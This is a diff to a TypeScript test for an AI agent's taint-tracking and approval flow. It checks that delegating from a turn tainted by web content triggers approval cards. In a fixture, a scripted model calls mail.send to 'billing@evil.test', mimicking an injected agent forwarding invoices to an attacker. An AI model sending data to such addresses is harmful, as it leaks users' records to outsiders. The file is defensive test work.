@@ -400,7 +400,11 @@ describe("taint persistence (S23 design-07/08)", () => {
       call("t1", "task.start", { title: "Follow up", goal: "forward invoices" }),
       say("Started."),
     ]);
-    await runTurn(h, "read and delegate");
+    // Delegating from a tainted turn always asks (design-08, #48).
+    const turn = start(h, "read and delegate");
+    await until(() => h.broker.issued.length === 1, "task_start card");
+    await h.broker.decideLatest("approve", h.clock);
+    await turn.done;
     const [task] = await h.tasks.list();
     expect(task?.taint).toBe(true);
     expect(task?.taintSources).toEqual([web]);
@@ -409,7 +413,7 @@ describe("taint persistence (S23 design-07/08)", () => {
     h.loop.registry.register(mail.registration);
     h.provider.script([call("m1", "mail.send", { to: "billing@evil.test" }), say("Hm.")]);
     const t = start(h, "step 2", { taskId: task?.id as string, threadId: "thr_task" });
-    await until(() => h.broker.issued.length === 1, "task run card");
+    await until(() => h.broker.issued.length === 2, "task run card");
     const decided = h.broker.decisions.at(-1);
     expect(decided?.ctx.taintSources).toEqual([{ sourceKind: "task" }, web]);
     expect(decided?.ctx).toMatchObject({ taint: true, newTarget: true });
